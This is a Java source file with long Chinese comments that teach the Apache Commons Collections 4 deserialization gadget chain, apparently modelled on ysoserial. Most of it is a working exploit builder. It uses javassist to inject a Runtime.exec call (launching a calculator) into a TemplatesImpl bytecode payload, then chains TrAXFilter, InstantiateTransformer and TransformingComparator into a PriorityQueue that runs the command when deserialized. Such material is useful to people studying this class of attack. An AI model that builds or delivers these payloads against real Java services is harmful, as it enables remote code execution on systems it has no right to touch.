package com.example.apache_collections;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
//import org.apache.xalan.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonCollection4 {
    /*
    同CommonCollection2，和 CommonCollection3两个教程， CommonCollection4是通过 Template, PriorityQueue 两个类来作为调用链
    但是由并非由`InvokeTransform` 而是由 `InstantiateTransformer` 来实现的

    照例， 先声明一个Template类

    由CommonCollection2知道， 如果想要使用`PriorityQueue` 来进行序列化调用，需要触发到 `PriorityQueue`.`readObject`函数中的`heapify`
    并进一步调用`compare`中的`this.compare.translate()`函数， 为了不忘记，再写一遍源码

     调用PriorityQueue来执行命令
    https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/java/util/PriorityQueue.java
    在PriorityQueue中, 有构造函数PriorityQueue(int, Comparator)
    并在siftDownUsingComparator/siftUpUsingComparator 两个函数中调用了
    而siftUp调用了sifteUpUsingComaparaotr, `Inserts item x at position k, maintaining heap invariant by`
        @SuppressWarnings("unchecked")
        private void heapify() {
            for (int i = (size >>> 1) - 1; i >= 0; i--)
                siftDown(i, (E) queue[i]);
        }
    在插入的时候会调用
     在readObject时会调用 `heapify()`

    而在 `TransformingComparator` 中,实现了Comparator的接口,并在调用 compare函数中使用了`transform`, 就可以完成了
    ```
            public int compare(final I obj1, final I obj2) {
                final O value1 = this.transformer.transform(obj1);
                final O value2 = this.transformer.transform(obj2);
                return this.decorated.compare(value1, value2);
            }
    ```
     this.compare可以通过构造函数来实现
            ```
                public TransformingComparator(final Transformer<? super I, ? extends O> transformer) {
                this(transformer, ComparatorUtils.NATURAL_COMPARATOR);
            }
            ```
     同样是`TransformingComparator`,这次由`InstantiateTransformer`来实现， 在声明`Template`类后， 使用`TransformingComparator` 来构造一个链
     ```java
     ConstantTransformer constantTransformer = new ConstantTransformer(String.class);

    // 可以通过instantiateTRansormer 来实例TrAXFilter.class 来实现，但是需要反射
     InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class}, new Object[]{"ls"});
     Object i = instantiateTransformer.transform(String.class);
     ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {constantTransformer, instantiateTransformer});

     TransformingComparator trans = new TransformingComparator(chainedTransformer)

     ```
     继续声明一个`PriorityQueue`类， 该类长度为2, 使用`trans`作为其比较器
     ```java
        Queue queue = new PriorityQueue(2, trans);
        queue.add(1);
        queue.add(2);
     ```

     最后通过反射将`InstantiateTransformer` 和 `ConstantTransformer`类中的变量，反射设置为`template`和 `TrAXFilter`
     ```java
        Class constant_class = ConstantTransformer.class;
        Field constant_field = constant_class.getDeclaredField("iConstant");
        constant_field.setAccessible(true);
        constant_field.set(constantTransformer, TrAXFilter.class);

        Class[] paramTypes = new Class[]{String.class};
        Object[] Args = new Object[] {"ls"};

        Class instant_class = InstantiateTransformer.class;
        Field instant_field = instant_class.getDeclaredField("iParamTypes");
        instant_field.setAccessible(true);
        instant_field.set(instantiateTransformer, new Class[] {Templates.class});
        Field instant_field2 = instant_class.getDeclaredField("iArgs");
        instant_field2.setAccessible(true);
        instant_field2.set(instantiateTransformer, new Object[]{template});

     ```

     执行反序列化操作， 可以得到计算器
     ```java
        byte[] b = do_serialize(queue);
        Object a = do_unserialize(b);
    ```
    其报错为：
    ```java
    Exception in thread "main" org.apache.commons.collections4.FunctorException: InstantiateTransformer: Constructor threw an exception
	at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:124)
	at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)
	at org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:112)
	at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:699)
	at java.util.PriorityQueue.siftDown(PriorityQueue.java:667)
	at java.util.PriorityQueue.heapify(PriorityQueue.java:713)
	at java.util.PriorityQueue.readObject(PriorityQueue.java:773)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
	at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)
	at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)
	at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)
	at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)

    ```

    但是为什么不直接设置呢， 在 `CommonCollection2`中已经做了测试，会报错返回
    ```java
    The method 'newTransformer' on 'class java.lang.Integer' does not exist
    ```
    到此`CommonCollection4` 结束

     */
    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
        }
    }

    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static <template> void main(String[] args) throws ClassNotFoundException,
                                                                IllegalAccessException,
                                                InstantiationException, CannotCompileException,
                                                IOException, NotFoundException, NoSuchFieldException {
        Class tplClass =  Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        Class abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        Class transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        final Object template =  tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(CommonCollections2.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));

        final CtClass clazz = pool.get(CommonCollections2.StubTransletPayload.class.getName());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"galculator\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();
        Field bytecodes = tplClass.getDeclaredField("_bytecodes");
        // 由于_bytecodes是private属性,需要 设置 Access = TRue
        bytecodes.setAccessible(true);
        // bytecodes 是 [][] 类型的,所以要加另外一个类,即上边的FOO
        // 我们把它的classfiles类拿过来用一下
        bytecodes.set(template, new byte[][]{classBytes, com.example.apache_collections.ClassFiles.classAsBytes(CommonCollections2.Foo.class)});

        Field name = tplClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(template, "Pwnr");

        Field tfactory = tplClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(template, transFactory.newInstance());

//        ((Templates) template).getOutputProperties();
        //"https://github-production-release-asset-2e65be.s3.amazonaws.com/41199577/f19fc800-a479-11ea-8673-875485405b62?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200602%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200602T152042Z&X-Amz-Expires=300&X-Amz-Signature=80d80682017413a021042835f90904ee91f0a089d5f6816bf1ed9e5c3a729894&X-Amz-SignedHeaders=host&actor_id=0&repo_id=41199577&response-content-disposition=attachment%3B%20filename%3DSimplenote-linux-1.17.0-x86_64.AppImage&response-content-type=application%2Foctet-stream"
        /*
        测试 直接调用
         */
        ConstantTransformer constantTransformer = new ConstantTransformer(TrAXFilter.class);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{template});
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {constantTransformer, instantiateTransformer});
        TransformingComparator trans = new TransformingComparator(chainedTransformer);
//        trans.compare(1, 1);

        PriorityQueue priorityQueue = new PriorityQueue(2, trans);
        priorityQueue.add(1);
        priorityQueue.add(2);


//        ConstantTransformer constantTransformer = new ConstantTransformer(String.class);
//
//        // 可以通过instantiateTRansormer 来实例TrAXFilter.class 来实现，但是需要反射
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{String.class}, new Object[]{"ls"});
//        Object i = instantiateTransformer.transform(String.class);
//        System.out.println(i);
////        InstantiateTransformer instantiateTransformer1 = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{template});
////        Object i2 = instantiateTransformer1.transform(TrAXFilter.class);
//
//
//        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {constantTransformer, instantiateTransformer});
//
//        Queue queue = new PriorityQueue(2, new TransformingComparator(chainedTransformer));
//        queue.add(1);
//        queue.add(2);
//
//        Class constant_class = ConstantTransformer.class;
//        Field constant_field = constant_class.getDeclaredField("iConstant");
//        constant_field.setAccessible(true);
//        constant_field.set(constantTransformer, TrAXFilter.class);
//
//        Class[] paramTypes = new Class[]{String.class};
//        Object[] Args = new Object[] {"ls"};
//
//        Class instant_class = InstantiateTransformer.class;
//        Field instant_field = instant_class.getDeclaredField("iParamTypes");
//        instant_field.setAccessible(true);
//        instant_field.set(instantiateTransformer, new Class[] {Templates.class});
//        Field instant_field2 = instant_class.getDeclaredField("iArgs");
//        instant_field2.setAccessible(true);
//        instant_field2.set(instantiateTransformer, new Object[]{template});
//
//        byte[] b = do_serialize(priorityQueue);
//        Object a = do_unserialize(b);






    }

    public static byte[]  do_serialize(Object obj) throws IOException {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();

        ObjectOutputStream oos = new ObjectOutputStream(btout);
        oos.writeObject(obj);
        System.out.println("do serialized success");
        return btout.toByteArray();
    }

    public static Object do_unserialize(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream btin = new ByteArrayInputStream(data);
        ObjectInputStream ooi = new ObjectInputStream(btin);

        System.out.println("do unserialized success");
        return ooi.readObject();
    }
}
